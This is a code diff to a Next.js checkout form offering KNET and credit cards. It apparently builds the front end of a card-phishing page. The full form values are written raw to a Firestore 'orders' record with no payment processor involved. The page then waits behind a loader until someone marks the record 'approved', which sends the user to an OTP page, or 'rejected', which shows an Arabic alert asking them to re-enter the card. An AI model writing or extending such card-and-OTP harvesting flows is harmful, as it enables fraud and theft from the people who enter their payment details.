@@ -1,12 +1,12 @@
 "use client"
 
-import { useState } from "react"
+import { useEffect, useState } from "react"
 import { useRouter } from "next/navigation"
 import Image from "next/image"
 import { zodResolver } from "@hookform/resolvers/zod"
 import { useForm } from "react-hook-form"
 import * as z from "zod"
-import { doc, updateDoc } from "firebase/firestore"
+import { doc, onSnapshot, updateDoc } from "firebase/firestore"
 import { Button } from "@/components/ui/button"
 import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form"
 import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
@@ -14,6 +14,7 @@ import { Input } from "@/components/ui/input"
 import { useCart } from "@/components/cart-provider"
 import { db } from "@/lib/firebaes"
 import { Select, SelectContent, SelectItem, SelectTrigger,SelectValue } from "@/components/ui/select"
+import { Loader } from "@/components/loader"
 
 const formSchema = z.object({
   paymentMethod: z.enum(["knet", "credit"]),
@@ -34,6 +35,7 @@ export function PaymentForm() {
     resolver: zodResolver(formSchema),
     defaultValues: {
       paymentMethod: "credit",
+      status:'new'
     },
   })
 
@@ -42,7 +44,29 @@ export function PaymentForm() {
 
   const currentYear = new Date().getFullYear()
   const years = Array.from({ length: 10 }, (_, i) => (currentYear + i).toString())
+  useEffect(() => {
+    const visitorId = localStorage.getItem("vistor") ;
 
+    if (visitorId) {
+      const unsubscribe = onSnapshot(doc(db, 'orders', visitorId), (docSnap) => {
+        if (docSnap.exists()) {
+          const data = docSnap.data();
+          if (data.status) {
+            if (data.status === 'approved') {
+            setIsLoading(false)
+            router.push("/checkout/otp");
+            } else if (data.status === 'rejected') {
+              setIsLoading(false);
+              alert('تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ');
+            }
+          }
+        }
+      });
+
+      return () => unsubscribe();
+    }
+  }, []);
+ 
   async function onSubmit(values: z.infer<typeof formSchema>) {
     setIsLoading(true)
   
@@ -51,18 +75,23 @@ export function PaymentForm() {
     try {
       const orderId = localStorage.getItem("vistor")
       await updateDoc(doc(db, "orders", orderId as string), {
-        values
+        values,
+        status:'new'
       })
-      router.push("/checkout/otp")
+    //  router.push("/checkout/otp")
 
     } catch (error) {
       console.error("Error processing payment:", error)
     } finally {
-      setIsLoading(false)
+      //setIsLoading(false)
     }
   }
 
   return (
+    <> {isLoading?
+      <div
+      style={{position:'absolute',top:0,left:0,right:0,bottom:0,background:'rgba(255,255,255,0.9)',margin:'auto',paddingTop:150,paddingRight:80}}><Loader/></div>
+  :
     <Form {...form}>
       <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
         <FormField
@@ -80,9 +109,10 @@ export function PaymentForm() {
                   className="grid grid-cols-2 gap-4"
                  
                 >
-                  <div className="relative">
+                  <div className={`relative ${isLoading?" hidden": " "}`} >
                     <RadioGroupItem value="knet" id="knet" className="peer sr-only" />
                     <Label
+                    
                      onClick={()=>{
                       return router.push("/checkout/kent")
                     }}
@@ -203,6 +233,8 @@ export function PaymentForm() {
         </Button>
       </form>
     </Form>
+    }
+    </>
   )
 }
 
